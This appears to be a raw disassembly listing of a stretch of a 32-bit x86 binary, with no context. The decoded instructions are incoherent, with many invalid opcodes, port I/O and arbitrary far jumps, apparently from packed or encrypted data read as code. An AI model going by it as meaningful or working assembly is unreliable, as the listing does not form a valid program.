  41c8d3:	and    esi,0x75
  41c8d6:	or     al,0x86
  41c8d8:	repnz dec eax
  41c8da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8db:	rcl    DWORD PTR [ecx+0x4dc00a33],1
  41c8e1:	ret    
  41c8e2:	call   0xda4e:0xc9507ac
  41c8e9:	lods   eax,DWORD PTR ds:[esi]
  41c8ea:	ror    BYTE PTR ds:0xf56f3f7c,cl
  41c8f0:	push   eax
  41c8f1:	fistp  QWORD PTR [esi+0x559b253]
  41c8f7:	xchg   edi,eax
  41c8f8:	mov    ecx,0x42685ac7
  41c8fd:	mov    ebp,0xb5879d6c
  41c902:	shr    ebx,0x82
  41c905:	outs   dx,DWORD PTR ds:[esi]
  41c906:	in     eax,dx
  41c907:	pusha  
  41c908:	and    ebx,DWORD PTR [eax]
  41c90a:	(bad)  
  41c90b:	jnp    0x41c969
  41c90d:	push   ss
  41c90e:	stos   DWORD PTR es:[edi],eax
  41c90f:	js     0x41c97a
  41c911:	ins    DWORD PTR es:[edi],dx
  41c912:	(bad)  
  41c913:	outs   dx,BYTE PTR ds:[esi]
  41c914:	jno    0x41c930
  41c916:	push   esi
  41c917:	mov    ah,0xea
  41c919:	fldcw  WORD PTR [esi+eiz*2]
  41c91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c91d:	sbb    al,0xd0
  41c91f:	xor    BYTE PTR [esi],ah
  41c921:	pop    es
  41c922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c923:	scas   al,BYTE PTR es:[edi]
  41c924:	and    esi,ecx
  41c926:	shr    BYTE PTR [ebx+0x3093270e],1
  41c92c:	imul   dh
  41c92e:	adc    BYTE PTR [ebp+0x35a1572e],cl
  41c934:	and    al,0x44
  41c936:	mov    ah,0xba
  41c938:	jno    0x41c91a
  41c93a:	push   eax
  41c93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c93c:	add    ebp,DWORD PTR [eax-0x25a12ae2]
  41c942:	lds    ebx,FWORD PTR [ecx+ebx*4-0x59]
  41c946:	mov    ebp,0xff8f2988
  41c94b:	cmp    eax,0x2e4ea6cc
  41c950:	jmp    0x38fcc32b
  41c955:	add    eax,0xa11ebf08
  41c95a:	mov    al,ds:0xb0acdc48
  41c95f:	mov    eax,ds:0x9cee47bc
  41c964:	add    edi,DWORD PTR [ebx+0x37]
  41c967:	sbb    ecx,DWORD PTR [edx]
  41c969:	xchg   esi,eax
  41c96a:	aaa    
  41c96b:	dec    ebx
  41c96c:	mov    al,0xe
  41c96e:	cli    
  41c96f:	cmp    esi,esp
  41c971:	sbb    al,0xc8
  41c973:	sti    
  41c974:	std    
  41c975:	ja     0x41c9f1
  41c977:	cmp    al,0xeb
  41c979:	pop    edx
  41c97a:	mov    bh,0xaa
  41c97c:	in     eax,dx
  41c97d:	dec    esp
  41c97e:	jae    0x41c917
  41c980:	(bad)  
  41c981:	cmp    ch,BYTE PTR [edi]
  41c983:	in     al,0x14
  41c985:	jmp    0x89e1:0x6df2628b
  41c98c:	xor    DWORD PTR [edi],edi
  41c98e:	push   cs
  41c98f:	xor    ah,bl
  41c991:	add    DWORD PTR [edi-0x3717b755],ecx
  41c997:	scas   eax,DWORD PTR es:[edi]
  41c998:	mov    ebx,0xe040f752
  41c99d:	mov    ebx,0x3a809c90
  41c9a2:	imul   ecx,DWORD PTR [edx],0xa0fe9efd
  41c9a8:	or     BYTE PTR [ebx+0x47ea31d6],0x98
  41c9af:	daa    
  41c9b0:	ins    DWORD PTR es:[edi],dx
  41c9b1:	jmp    DWORD PTR [edi+0x73]
  41c9b4:	or     edi,ebx
  41c9b6:	test   eax,0x77e5984a
  41c9bb:	jg     0x41ca0e
  41c9bd:	xor    al,BYTE PTR [edi+0x5c]
  41c9c0:	nop
  41c9c1:	cli    
  41c9c2:	rcl    edi,cl
  41c9c4:	adc    al,0x6f
  41c9c6:	lahf   
  41c9c7:	loope  0x41ca30
  41c9c9:	js     0x41c9a9
  41c9cb:	clc    
  41c9cc:	cmc    
  41c9cd:	xor    bh,BYTE PTR [ebx+0x4f144c77]
  41c9d3:	pop    eax
  41c9d4:	adc    al,0xfb
  41c9d6:	and    al,0x27
  41c9d8:	pop    edx
  41c9d9:	push   edi
  41c9da:	push   cs
  41c9db:	jg     0x41c9df
  41c9dd:	(bad)  
  41c9de:	or     esi,esi
  41c9e0:	fisub  WORD PTR es:[edi+0x6b0c4f4]
  41c9e7:	adc    ch,BYTE PTR [edi-0x3]
  41c9ea:	ror    BYTE PTR [ecx-0x4],cl
  41c9ed:	popa   
  41c9ee:	jmp    0xa164:0x9a42222
  41c9f5:	mov    WORD PTR [eax],ds
  41c9f7:	mov    eax,0xdb261e54
  41c9fc:	push   edi
  41c9fd:	cmp    ah,BYTE PTR cs:[edi+0x2a]
  41ca01:	mov    eax,0x3862f1c9
  41ca06:	nop
  41ca07:	xchg   esp,eax
  41ca08:	push   es
  41ca09:	add    DWORD PTR [ebx-0x47],esi
  41ca0c:	loop   0x41c9f2
  41ca0e:	inc    ecx
  41ca0f:	adc    DWORD PTR [ebp+0x38],ebx
  41ca12:	outs   dx,DWORD PTR ds:[esi]
  41ca13:	or     eax,0x711617f
  41ca18:	shr    ecx,1
  41ca1a:	shr    DWORD PTR [edi-0x56],cl
  41ca1d:	sub    BYTE PTR [eax-0x62],ch
  41ca20:	jne    0x41c9af
  41ca22:	mov    edi,0x97b11022
  41ca27:	aad    0xc6
  41ca29:	or     eax,0xda19a228
  41ca2e:	mov    ebx,0x2071a058
  41ca33:	push   ds
  41ca34:	sub    edx,DWORD PTR [ecx]
  41ca36:	cmp    eax,0x589f6706
  41ca3b:	adc    al,0xdf
  41ca3d:	mov    ecx,0x7a77342c
  41ca42:	xchg   edx,eax
  41ca43:	jno    0x41cab4
  41ca45:	mov    ax,0xa12a
  41ca49:	xor    BYTE PTR [esi-0x49],dl
  41ca4c:	mov    ds,WORD PTR [esi+0x41e5c4e9]
  41ca52:	pop    ebx
  41ca53:	mov    ebx,0x9dbfff26
  41ca58:	and    bl,dl
  41ca5a:	inc    eax
  41ca5b:	bound  ebp,QWORD PTR [ecx]
  41ca5d:	data16 jle 0x41caca
  41ca60:	bound  esp,QWORD PTR [ebp-0x36df5fb2]
  41ca66:	aaa    
  41ca67:	sahf   
  41ca68:	imul   eax,DWORD PTR ds:0xf506b6d5,0x3ad57c67
  41ca72:	in     al,dx
  41ca73:	fst    QWORD PTR ds:0x20ebf99e
  41ca79:	call   0x89776675
  41ca7e:	fdiv   DWORD PTR [ebx+0x49494e83]
  41ca84:	sbb    al,0xa2
  41ca86:	nop
  41ca87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca88:	cmp    ebx,DWORD PTR [esi+0x26]
  41ca8b:	jb     0x41caed
  41ca8d:	push   ebp
  41ca8e:	ror    ah,cl
  41ca90:	pop    eax
  41ca91:	mov    edi,0x573962ef
  41ca96:	push   es
  41ca97:	dec    eax
  41ca98:	cmp    bl,BYTE PTR [ebx]
  41ca9a:	mov    esp,ds
  41ca9c:	retf   0xfbfd
  41ca9f:	ds inc ebx
  41caa1:	loop   0x41cada
  41caa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caa4:	(bad)  
  41caa5:	lahf   
  41caa6:	imul   esi,DWORD PTR [edi+0xa],0x8be597eb
  41caad:	scas   eax,DWORD PTR es:[edi]
  41caae:	xor    DWORD PTR [ebx],0xffffff96
  41cab1:	dec    esi
  41cab2:	cmp    BYTE PTR [edx+0xc],0xd2
  41cab6:	sar    BYTE PTR [esi-0x52723d5a],cl
  41cabc:	ftst   
  41cabe:	cmp    edx,DWORD PTR [ebp-0xc771a60]
  41cac4:	dec    edi
  41cac5:	fdiv   QWORD PTR [edx+0x30]
  41cac8:	jne    0x41caa8
  41caca:	lods   eax,DWORD PTR ds:[esi]
  41cacb:	sbb    BYTE PTR [eax],0xaa
  41cace:	jns    0x41ca77
  41cad0:	mov    dh,0x95
  41cad2:	imul   eax,DWORD PTR [ecx+eiz*8-0x55edb929],0xb
  41cada:	pop    es
  41cadb:	mov    esi,0x11d164fd
  41cae0:	icebp  
  41cae1:	sti    
  41cae2:	repz aam 0x38
  41cae5:	push   edi
  41cae6:	lods   al,BYTE PTR ds:[esi]
  41cae7:	sbb    bl,al
  41cae9:	and    DWORD PTR [esi],edx
  41caeb:	dec    esi
  41caec:	push   ecx
  41caed:	pop    edx
  41caee:	or     BYTE PTR [esi-0x4a],dh
  41caf1:	stos   BYTE PTR es:[edi],al
  41caf2:	bound  esi,QWORD PTR ds:[edi-0x3bd246dc]
  41caf9:	(bad)  
  41cafa:	stos   DWORD PTR es:[edi],eax
  41cafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cafc:	add    bl,dl
  41cafe:	ja     0x41ca8b
  41cb00:	aad    0x6f
  41cb02:	adc    DWORD PTR [eax],eax
  41cb04:	sub    al,0x99
  41cb06:	cwde   
  41cb07:	aad    0x61
  41cb09:	pop    es
  41cb0a:	in     al,0x8d
  41cb0c:	mov    ch,BYTE PTR [ebx]
  41cb0e:	mov    BYTE PTR [ecx+0x52],dl
  41cb11:	loope  0x41cabc
  41cb13:	loop   0x41cad6
  41cb15:	in     al,dx
  41cb16:	or     al,0xe
  41cb18:	(bad)  
  41cb19:	stc    
  41cb1a:	test   eax,0xf8c0a986
  41cb1f:	aad    0xc7
  41cb21:	int3   
  41cb22:	test   eax,0xb0d06f4d
  41cb27:	dec    edi
  41cb28:	enter  0xb7a6,0x1f
  41cb2c:	sub    dl,dl
  41cb2e:	add    edi,ebp
  41cb30:	fisttp WORD PTR [ebx+0x5975922]
  41cb36:	pop    eax
  41cb37:	jmp    0xb5ad7c35
  41cb3c:	mov    ah,ch
  41cb3e:	in     eax,dx
  41cb3f:	push   edx
  41cb40:	push   0xffffffd3
  41cb42:	jnp    0x41caf2
  41cb44:	sub    eax,0xbee5cfd9
  41cb49:	add    BYTE PTR [edx-0x30],bh
  41cb4c:	shl    ch,0x78
  41cb4f:	add    eax,0xb25c7d29
  41cb54:	fcmovnbe st,st(0)
  41cb56:	mov    esi,0x4e2240a7
  41cb5b:	sub    ch,cl
  41cb5d:	add    edx,DWORD PTR [ebx-0x12fc93fc]
  41cb63:	imul   edx,esp,0x63
  41cb66:	mov    esi,DWORD PTR [ebp+edx*4+0x16]
  41cb6a:	jnp    0x41cb8a
  41cb6c:	inc    esp
  41cb6d:	pop    ebp
  41cb6e:	hlt    
  41cb6f:	enter  0xf951,0xfd
  41cb73:	sub    eax,0x31dd699f
  41cb78:	push   esi
  41cb79:	aam    0xef
  41cb7b:	std    
  41cb7c:	add    DWORD PTR [esi+0x41],edx
  41cb7f:	in     eax,0x1e
  41cb81:	push   es
  41cb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb83:	shl    BYTE PTR [ebx-0x5df9910],cl
  41cb89:	out    0xc2,eax
  41cb8b:	pop    es
  41cb8c:	lods   al,BYTE PTR ds:[esi]
  41cb8d:	ret    
  41cb8e:	ret    0x195b
  41cb91:	dec    edi
  41cb92:	fs je  0x41cb7d
  41cb95:	cmp    dl,dh
  41cb97:	rcr    BYTE PTR [eax+0x37804439],0x68
  41cb9e:	sub    esp,eax
  41cba0:	mov    edx,0x469f3183
  41cba5:	pop    esp
  41cba6:	sub    DWORD PTR [edx],0xaf88a3cf
  41cbac:	mov    bl,0xae
  41cbae:	xor    al,0x93
  41cbb0:	xor    al,BYTE PTR [eax]
  41cbb2:	dec    edi
  41cbb3:	out    dx,eax
  41cbb4:	pop    eax
  41cbb5:	mov    dh,0x19
  41cbb7:	xchg   esi,eax
  41cbb8:	out    dx,al
  41cbb9:	xchg   ebp,eax
  41cbba:	cdq    
  41cbbb:	sbb    ch,bl
  41cbbd:	xor    al,0x8b
  41cbbf:	mov    esi,0xf7e158b7
  41cbc4:	push   edi
  41cbc5:	mov    al,ds:0xf3700260
  41cbca:	repz jmp 0x5bff:0x90b66efc
  41cbd2:	adc    esi,DWORD PTR [edi+ebx*8-0x62]
  41cbd6:	je     0x41cbd7
  41cbd8:	cdq    
  41cbd9:	fist   WORD PTR [edi+ebp*1-0x71]
  41cbdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbde:	arpl   WORD PTR [esi-0x25],sp
  41cbe1:	sti    
  41cbe2:	mov    fs,WORD PTR ds:0x152b0325
  41cbe8:	push   0x72286ca2
  41cbed:	pop    ds
  41cbee:	aas    
  41cbef:	sbb    BYTE PTR [esi+0x71604fee],0xd0
  41cbf6:	(bad)  
  41cbf7:	aas    
  41cbf8:	das    
  41cbf9:	inc    edx
  41cbfa:	loop   0x41cc34
  41cbfc:	push   es
  41cbfd:	xor    al,0xff
  41cbff:	ins    BYTE PTR es:[edi],dx
  41cc00:	repnz popf 
  41cc02:	inc    ebp
  41cc03:	into   
  41cc04:	mov    bl,BYTE PTR [ebp+0x1bb6ba85]
  41cc0a:	fadd   DWORD PTR [ecx]
  41cc0c:	repnz adc ebp,DWORD PTR [ecx]
  41cc0f:	(bad)  
  41cc11:	dec    edi
  41cc12:	fstp   TBYTE PTR [ecx]
  41cc14:	arpl   WORD PTR [ebp-0x70],cx
  41cc17:	jne    0x41cbf9
  41cc19:	add    dh,BYTE PTR [ecx+0x8]
  41cc1c:	out    0xc4,al
  41cc1e:	pop    esi
  41cc1f:	les    ebp,FWORD PTR [edx]
  41cc21:	nop
  41cc22:	pusha  
  41cc23:	mov    esi,0x6ecf33a8
  41cc28:	dec    edx
  41cc29:	sbb    eax,0x81375b4e
  41cc2e:	lahf   
  41cc2f:	mov    bl,0xd7
  41cc31:	das    
  41cc32:	fsub   DWORD PTR [ebx-0x4ea60b68]
  41cc38:	clc    
  41cc39:	jbe    0x41cbde
  41cc3b:	(bad)  
  41cc3c:	pop    es
  41cc3d:	mov    dl,0xe1
  41cc3f:	xlat   BYTE PTR ds:[ebx]
  41cc40:	jbe    0x41ccbd
  41cc42:	imul   eax,DWORD PTR [ebp-0x4],0x27d08dab
  41cc49:	out    0xcd,eax
  41cc4b:	dec    edx
  41cc4c:	adc    al,0xd
  41cc4e:	and    DWORD PTR [ecx-0x6e],ebx
  41cc51:	adc    bh,cl
  41cc53:	in     al,0xe1
  41cc55:	mov    edi,?
  41cc57:	adc    dh,BYTE PTR [ebx+0x6fbc3e12]
  41cc5d:	test   ah,dh
  41cc5f:	out    dx,eax
  41cc60:	and    eax,0x34c68eaf
  41cc65:	or     ebp,DWORD PTR [ebx]
  41cc67:	aad    0xf0
  41cc69:	mov    ebp,0xbdc977df
  41cc6e:	cmp    ch,BYTE PTR [esi+esi*4-0x13]
  41cc72:	mov    eax,ds:0x16457b1b
  41cc77:	jecxz  0x41cc2d
  41cc79:	xor    al,0xcf
  41cc7b:	pop    esp
  41cc7c:	fisttp DWORD PTR [edi+0x37]
  41cc7f:	push   ss
  41cc80:	mov    cl,0x75
  41cc82:	sub    ebx,edx
  41cc84:	add    eax,0x29f8a9fd
  41cc89:	mul    DWORD PTR [edx+edx*1]
  41cc8c:	arpl   WORD PTR [edx],bp
  41cc8e:	int    0xcf
  41cc90:	aad    0xce
  41cc92:	aad    0x6
  41cc94:	mov    ebp,0xfad85545
  41cc99:	mov    eax,ds:0x83e90c7f
  41cc9e:	repz push ds
  41cca0:	push   edx
  41cca1:	sar    bh,cl
  41cca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca4:	shr    DWORD PTR [ebp+0x470c2eed],1
  41ccaa:	push   0xd2460ea3
  41ccaf:	sbb    eax,0x841f963c
  41ccb4:	adc    DWORD PTR [edx-0x39dd895e],ebx
  41ccba:	inc    eax
  41ccbb:	xor    DWORD PTR [esi-0x776f896d],ebp
  41ccc1:	lods   al,BYTE PTR ds:[esi]
  41ccc2:	fld    TBYTE PTR [eax]
  41ccc4:	pop    edi
  41ccc5:	jbe    0x41cd18
  41ccc7:	imul   esi,DWORD PTR [ecx-0x30],0xdf46a2db
  41ccce:	dec    eax
  41cccf:	ss mov al,0x15
  41ccd2:	icebp  
  41ccd3:	cmp    al,0x87
  41ccd5:	pushf  
  41ccd6:	push   edx
  41ccd7:	pop    ebx
  41ccd8:	shl    DWORD PTR [eax+0x5f3872d9],cl
  41ccde:	bound  edi,QWORD PTR [ecx+0x730ea0e1]
  41cce4:	jnp    0x41cd0c
  41cce6:	inc    esp
  41cce7:	mov    eax,DWORD PTR [ebp+0x27fa2b4b]
  41cced:	push   ds
  41ccee:	sbb    BYTE PTR [eax+0x5f67ad9f],cl
  41ccf4:	dec    edx
  41ccf5:	jecxz  0x41ccfe
  41ccf7:	or     cl,BYTE PTR [edi]
  41ccf9:	cs (bad) 
  41ccfb:	ror    DWORD PTR [ebp-0x3d],1
  41ccfe:	into   
  41ccff:	sub    ecx,DWORD PTR [edx+0x69]
  41cd02:	or     al,0xe1
  41cd04:	inc    ebp
  41cd05:	rcr    BYTE PTR [ebx-0x1b4eea7c],1
  41cd0b:	jmp    0x5e0c418b
  41cd10:	stos   DWORD PTR es:[edi],eax
  41cd11:	sbb    BYTE PTR [esp+edx*4-0x105ca20],0x5f
  41cd19:	js     0x41cce5
  41cd1b:	into   
  41cd1c:	jmp    0x97c3:0x3e8e5338
  41cd23:	int3   
  41cd24:	call   0x9915:0xd14497e3
  41cd2b:	jmp    0xa821:0x3710cf5
  41cd32:	mov    eax,0x9b3288ab
  41cd37:	fld    st(2)
  41cd39:	aad    0x15
  41cd3b:	adc    al,BYTE PTR [ebp-0x778d69f0]
  41cd41:	sbb    eax,0xdd00a508
  41cd46:	int    0xea
  41cd48:	jmp    0x41cd5c
  41cd4a:	ror    BYTE PTR [ebx],0x87
  41cd4d:	mov    DWORD PTR [di],ebp
  41cd50:	icebp  
  41cd51:	popa   
  41cd52:	shl    ah,0xdb
  41cd55:	shl    BYTE PTR [ebp+0x6691daca],0x31
  41cd5c:	test   al,0x28
  41cd5e:	jmp    0x4608:0x87e0a5f0
  41cd65:	adc    al,dh
  41cd67:	leave  
  41cd68:	push   ds
  41cd69:	adc    eax,0xbf06851a
  41cd6e:	in     al,0x57
  41cd70:	fcmovb st,st(4)
  41cd72:	inc    ebp
  41cd73:	mov    ah,BYTE PTR [esi+0x16]
  41cd76:	stos   BYTE PTR es:[edi],al
  41cd77:	js     0x41cd4d
  41cd79:	pop    ebx
  41cd7a:	popa   
  41cd7b:	adc    eax,0x93814587
  41cd80:	cmp    edi,esp
  41cd82:	jge    0x41cd0c
  41cd84:	test   BYTE PTR [esi-0x19],cl
  41cd87:	xchg   ebx,eax
  41cd88:	xor    DWORD PTR [ecx+0x61],esi
  41cd8b:	jbe    0x41cd5f
  41cd8d:	cwde   
  41cd8e:	pushf  
  41cd8f:	icebp  
  41cd90:	jmp    0x7607ed00
  41cd95:	xor    BYTE PTR ds:[edi+0x5c223d52],dh
  41cd9c:	call   0x6a5c0c03
  41cda1:	sub    al,0x44
  41cda3:	jbe    0x41ce0c
  41cda5:	mov    ds,WORD PTR [eax+0x482ca71]
  41cdab:	ss pop ss
  41cdad:	daa    
  41cdae:	aam    0x1a
  41cdb0:	into   
  41cdb1:	inc    esi
  41cdb2:	out    dx,al
  41cdb3:	les    ecx,FWORD PTR [esi+0x2b]
  41cdb6:	jg     0x41cdc4
  41cdb8:	test   BYTE PTR [edi],0x3f
  41cdbb:	and    al,0xe1
  41cdbd:	sub    DWORD PTR [eax+0x16],0x29
  41cdc1:	int    0x90
  41cdc3:	push   ds
  41cdc4:	jnp    0x41cde9
  41cdc6:	mov    ch,0xa5
  41cdc8:	xlat   BYTE PTR ds:[ebx]
  41cdc9:	xchg   edx,eax
  41cdca:	test   BYTE PTR [ecx],cl
  41cdcc:	mov    ds:0x5d72fcd8,al
  41cdd1:	pop    ebx
  41cdd2:	jecxz  0x41ce39
  41cdd4:	adc    DWORD PTR [ecx],0x4a
  41cdd7:	aaa    
  41cdd8:	pop    edi
  41cdd9:	jo     0x41cdb5
  41cddb:	push   edx
  41cddc:	outs   dx,DWORD PTR ds:[esi]
  41cddd:	or     eax,0xce90b400
  41cde2:	sahf   
  41cde3:	popf   
  41cde4:	imul   bx,WORD PTR [ecx+0x22],0x9d8b
  41cdea:	rcr    DWORD PTR ds:0x28037268,0x10
  41cdf1:	fmul   DWORD PTR [edi-0x3a]
  41cdf4:	es pop esi
  41cdf6:	inc    ecx
  41cdf7:	iret   
  41cdf8:	mov    ds:0x1638903b,eax
  41cdfd:	aaa    
  41cdfe:	cs sub al,0xbf
  41ce01:	icebp  
  41ce02:	scas   eax,DWORD PTR es:[edi]
  41ce03:	retf   
  41ce04:	imul   edx,DWORD PTR ds:[ebx+ebp*4],0xffffffa6
  41ce09:	in     eax,0xfb
  41ce0b:	aam    0x9f
  41ce0d:	jmp    0x41cdff
  41ce0f:	ret    
  41ce10:	xchg   ebp,eax
  41ce11:	add    bl,BYTE PTR [edx]
  41ce13:	lea    edi,[edi+0x6d22e9b8]
  41ce19:	sub    al,0xbe
  41ce1b:	mov    BYTE PTR [eax-0x1f2470da],0xd5
  41ce22:	aaa    
  41ce23:	call   0x5e9f6c44
  41ce28:	cmc    
  41ce29:	loop   0x41ce50
  41ce2b:	stos   DWORD PTR es:[edi],eax
  41ce2c:	push   0x76
  41ce2e:	jo     0x41ce12
  41ce30:	or     eax,0x3418611f
  41ce35:	in     eax,dx
  41ce36:	sbb    BYTE PTR [ebp+0x238b3d77],ah
  41ce3c:	lea    esi,[ecx-0x7d60c828]
  41ce42:	shr    DWORD PTR [ebx+0x1c5e1a5b],cl
  41ce48:	sub    DWORD PTR [edi+0x774121db],ebx
  41ce4e:	es inc esp
  41ce50:	sub    bl,BYTE PTR [ebp+0x21]
  41ce53:	out    dx,eax
  41ce54:	leave  
  41ce55:	mov    WORD PTR [edi-0x76],ss
  41ce58:	adc    esi,edx
  41ce5a:	mov    eax,ds:0x972bdefb
  41ce5f:	cmp    al,0xd3
  41ce61:	gs bnd js 0x41ce34
  41ce65:	push   es
  41ce66:	leave  
  41ce67:	and    eax,0xc6ad1d3d
  41ce6c:	push   es
  41ce6d:	mov    bl,0xf9
  41ce6f:	dec    esi
  41ce70:	mov    ebx,0x61ae8ccf
  41ce75:	addr16 push ebp
  41ce77:	jp     0x41cef5
  41ce79:	xchg   esp,eax
  41ce7a:	imul   edi,DWORD PTR [edi],0xe5f03060
  41ce80:	scas   eax,DWORD PTR es:[edi]
  41ce81:	ins    DWORD PTR es:[edi],dx
  41ce82:	mov    eax,0x28182663
  41ce87:	popa   
  41ce88:	push   ecx
  41ce89:	js     0x41ce66
  41ce8b:	push   cs
  41ce8c:	lods   eax,DWORD PTR ds:[esi]
  41ce8d:	icebp  
  41ce8e:	arpl   WORD PTR [ebp+0x42],dx
  41ce91:	xchg   edx,eax
  41ce92:	jmp    0x41ce14
  41ce94:	mov    edi,0x13189b66
  41ce99:	xor    dh,BYTE PTR [edi-0x46]
  41ce9c:	(bad)  [ebx-0x3fcf50ec]
  41cea2:	mov    ds:0xb2179fd9,eax
  41cea7:	lods   al,BYTE PTR ds:[esi]
  41cea8:	aas    
  41cea9:	xor    edi,eax
  41ceab:	sub    al,0x20
  41cead:	cli    
  41ceae:	cmp    edi,esi
  41ceb0:	xor    eax,0x80d48fcc
  41ceb5:	add    edi,ebp
  41ceb7:	sbb    ecx,ebp
  41ceb9:	xor    al,0x7a
  41cebb:	and    al,0xb2
  41cebd:	fs inc edi
  41cebf:	lods   eax,DWORD PTR ds:[esi]
  41cec0:	cmp    al,0xa2
  41cec2:	sub    BYTE PTR [ebx+esi*1-0x95118e9],bl
  41cec9:	call   DWORD PTR [ecx+esi*1]
  41cecc:	mov    ebx,DWORD PTR [esi]
  41cece:	xchg   ebx,eax
  41cecf:	and    eax,0x288c97ec
  41ced4:	out    0x52,al
  41ced6:	add    bh,BYTE PTR [esi+edi*4]
  41ced9:	ds int3 
  41cedb:	lea    eax,[ecx-0x6b]
  41cede:	push   cs
  41cedf:	arpl   WORD PTR [eax-0x11],si
  41cee2:	cmp    esp,esi
  41cee4:	push   edi
  41cee5:	data16 ja 0x41cebc
  41cee8:	loope  0x41cee3
  41ceea:	fistp  DWORD PTR [edi]
  41ceec:	in     eax,dx
  41ceed:	in     eax,dx
  41ceee:	jb     0x41cec9
  41cef0:	pop    ds
  41cef1:	push   esi
  41cef2:	out    0xf9,eax
  41cef4:	inc    esi
  41cef5:	sub    DWORD PTR [ebp+0x1],edx
  41cef8:	adc    DWORD PTR [ecx-0x566b8de0],ecx
  41cefe:	pop    ebx
  41ceff:	dec    esp
  41cf00:	dec    esp
  41cf01:	ds push cs
  41cf03:	leave  
  41cf04:	test   BYTE PTR [eax+edx*4-0x13],0xa7
  41cf09:	pushf  
  41cf0a:	ficomp DWORD PTR [ebx]
  41cf0c:	neg    BYTE PTR [edi]
  41cf0e:	mov    ch,0x94
  41cf10:	aam    0xf5
  41cf12:	outs   dx,BYTE PTR ds:[esi]
  41cf13:	and    al,0x9b
  41cf15:	jecxz  0x41cf13
  41cf17:	outs   dx,BYTE PTR ds:[esi]
  41cf18:	std    
  41cf19:	adc    ah,BYTE PTR [edx-0x8]
  41cf1c:	repz push eax
  41cf1e:	pop    ebx
  41cf1f:	xor    BYTE PTR [eax+eiz*4],dl
  41cf22:	ret    
  41cf23:	pop    edi
  41cf24:	pushf  
  41cf25:	fwait
  41cf26:	push   ds
  41cf27:	xchg   al,cl
  41cf29:	mov    cl,0x80
  41cf2b:	jmp    0x41cf3f
  41cf2d:	mov    ds:0xafda82cf,eax
  41cf32:	js     0x41cec7
  41cf34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf35:	sub    DWORD PTR [edx-0x1b12e50e],ebx
  41cf3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf3c:	or     BYTE PTR [ebx],bl
  41cf3e:	outs   dx,BYTE PTR ds:[esi]
  41cf3f:	add    al,0xc3
  41cf41:	xchg   esp,eax
  41cf42:	add    BYTE PTR [esi],dl
  41cf44:	aas    
  41cf45:	jmp    0xc8964e91
  41cf4a:	ins    DWORD PTR es:[edi],dx
  41cf4b:	push   ebx
  41cf4c:	xchg   DWORD PTR [esi-0x71],ebp
  41cf4f:	xchg   edi,eax
  41cf50:	mov    eax,ds:0xf337e428
  41cf55:	mov    esi,0x3b295706
  41cf5a:	movq   mm7,mm5
  41cf5d:	add    BYTE PTR [ecx-0x2e],bh
  41cf60:	adc    ebx,DWORD PTR [edx]
  41cf62:	xchg   ebp,eax
  41cf63:	jo     0x41cfbc
  41cf65:	jo     0x41cf8d
  41cf67:	mov    ah,0xa2
  41cf69:	test   DWORD PTR cs:[edx+0x5e4cb730],0x822305ef
  41cf74:	adc    ebp,ebp
  41cf76:	loopne 0x41cfe6
  41cf78:	pop    ebp
  41cf79:	loop   0x41cfa1
  41cf7b:	xchg   ebp,eax
  41cf7c:	adc    DWORD PTR [ecx*1+0x27355e14],esi
  41cf83:	push   0x6e
  41cf85:	loopne 0x41cf62
  41cf87:	pop    ss
  41cf88:	xchg   esp,eax
  41cf89:	icebp  
  41cf8a:	dec    ebx
  41cf8b:	mov    BYTE PTR [ebp+0x2b],al
  41cf8e:	jg     0x41cfc2
  41cf90:	mov    ch,0x31
  41cf92:	xchg   esp,eax
  41cf93:	cmp    al,0xd8
  41cf95:	aam    0x20
  41cf97:	adc    eax,0x8633951b
  41cf9c:	mov    bl,0xc4
  41cf9e:	xor    BYTE PTR [ebp-0x1],dl
  41cfa1:	push   es
  41cfa2:	mov    al,ds:0xd07eb7ec
  41cfa7:	mov    edx,0xa26229d4
  41cfac:	ja     0x41cf61
  41cfae:	mov    ecx,esp
  41cfb0:	adc    BYTE PTR [edx],bh
  41cfb2:	push   ecx
  41cfb3:	retf   
  41cfb4:	push   ds
  41cfb5:	mov    es,WORD PTR ds:0x1a9f2812
  41cfbb:	xchg   esi,eax
  41cfbc:	add    DWORD PTR [edi+0xdb49d57],0x5c
  41cfc3:	jmp    0xca87:0x1d2d027f
  41cfca:	daa    
  41cfcb:	mov    ebx,0xc4e8ff15
  41cfd0:	push   esi
  41cfd1:	aam    0xed
  41cfd3:	and    eax,0x5ba2f78b
  41cfd8:	pop    esp
  41cfd9:	fisttp WORD PTR [ecx-0x77]
  41cfdc:	xchg   ecx,eax
  41cfdd:	lods   eax,DWORD PTR ds:[esi]
  41cfde:	add    al,0x1d
  41cfe0:	pop    esi
  41cfe1:	jns    0x41d013
  41cfe3:	or     ebx,esp
  41cfe5:	jl     0x41cfcf
  41cfe7:	shl    edx,1
  41cfe9:	sbb    BYTE PTR [edi+ecx*8-0x31],cl
  41cfed:	mov    bh,0xb3
  41cfef:	stos   BYTE PTR es:[edi],al
  41cff0:	lea    esp,[ebx+0x11]
  41cff3:	adc    dh,BYTE PTR [ebp-0x31]
  41cff6:	js     0x41cf9f
  41cff8:	icebp  
  41cff9:	scas   eax,DWORD PTR es:[edi]
  41cffa:	data16 sbb al,0xda
  41cffd:	push   0x20
  41cfff:	pop    ds
  41d000:	iret   
  41d001:	mov    ch,dl
  41d003:	out    0x8a,al
  41d005:	pop    ecx
  41d006:	fidivr DWORD PTR [eax+0x7c]
  41d009:	repz lds edi,FWORD PTR [eax+0x204a064b]
  41d010:	mov    eax,ds:0xd2b26e55
  41d015:	mov    ebx,esp
  41d017:	pop    eax
  41d018:	add    BYTE PTR [edi+0x6d],0x56
  41d01c:	(bad)  
  41d01d:	ret    
  41d01e:	jae    0x41d07f
  41d020:	pop    ebp
  41d021:	push   0x13edb447
  41d026:	add    ecx,DWORD PTR [esi]
  41d028:	jl     0x41d07f
